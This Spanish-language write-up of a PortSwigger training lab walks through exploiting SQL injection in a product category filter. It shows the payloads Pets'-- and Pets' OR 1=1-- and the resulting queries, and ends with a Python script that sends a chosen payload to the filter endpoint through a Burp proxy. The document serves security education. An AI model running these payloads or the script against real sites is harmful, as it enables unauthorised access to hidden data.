---
title: "01 Write-up: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
collection: publications
category: portswigger
permalink: /publications/SQLi/01_SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Para resolver el laboratorio, realizamos un ataque de inyección SQL que hace que la aplicación muestre detalles de todos los productos de cualquier categoría, tanto liberados como no liberados.'
date: 2024-11-30
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQL injection vulnerability in WHERE clause allowing retrieval of hidden data'
---

![lab_logo]({{site.url}}/images/SQLi/sqli-1/logo.png)

Lab-Link: <https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data>  
Dificultad: APPRENTICE  

## Descripción de laboratorio

![lab_description]({{site.url}}/images/SQLi/sqli-1/lab_description.png)

## Query

La consulta utilizada por la aplicación se proporciona en la descripción del laboratorio. Supongo que la cadena de categoría se toma directamente del argumento de la URL

```sql
SELECT * FROM products WHERE category = '<PARAM>' AND released = 1
```

## Pasos

### Encontrar un punto de referencia

Para conocer la referencia de los productos liberados, filtro por `Pets`, que muestra 3 entradas. 

### Ignorar la parte liberada de la consulta

Ahora necesito inyectar algo que haga que se ignore la parte 'AND released = 1', por ejemplo inyectando un comentario que ignore todas las partes restantes de la consulta.

Por ejemplo, inyectando `Pets'--` se obtiene esta consulta:

```sql
SELECT * FROM products WHERE category = 'Pets'--' AND released = 1
```

Observe la comilla simple después del `--`, que es añadida por la aplicación. Esto sería un error de sintaxis, pero debido al comentario se ignora y no tenemos que tratar con él.

#### URL encode

La URL debe estar correctamente codificada. Cuando se utiliza un navegador, esto se hará automáticamente por el navegador, pero no se muestra en la barra de URL. Cuando se utiliza el Burp Repeater, la codificación de la URL debe hacerse manualmente con `Ctrl+U`.

![url encode in burp]({{site.url}}/images/SQLi/sqli-1/url_encode.png)

==> Se muestran 4 entradas, por lo que la parte liberada se comenta correctamente.

### Mostrar todos los productos independientemente de su categoría

Para mostrar todos los productos, independientemente de su categoría o estado de liberación, necesito inyectar una cadena que se evalúe como `TRUE` para cada entrada de la tabla. Por ejemplo, la expresión `1=1`.

```sql
Pets' OR 1=1--
```
El resultado es la consulta

```sql
SELECT * FROM products WHERE category = 'Pets' or 1=1 -- ' AND released = 1
```

Que muestra todas las entradas ya que para cada entrada la condición 1=1 permanece verdadera. El laboratorio se actualiza a

![Result]({{site.url}}/images/SQLi/sqli-1/result.png)

```python
import requests
import sys
import urllib3

# Desactiva advertencias de verificación SSL.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración de proxy para herramientas como Burp Suite.
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    """
    Prueba una inyección SQL en el parámetro `category` de un endpoint específico.
    """
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    # Comprobamos si la respuesta contiene el indicador de éxito "Cat Grib".
    if "Cat Grib" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        # Extrae la URL y el payload de los argumentos de línea de comandos.
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        # Muestra el formato de uso si faltan argumentos.
        print("[-] Uso: %s <url> <payload>" % sys.argv[0])
        print('[-] Ejemplo: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    # Llama a la función para intentar la inyección SQL.
    if exploit_sqli(url, payload):
        print("[+] ¡Inyección SQL exitosa!")
    else:
        print("[-] Inyección SQL no exitosa.")

```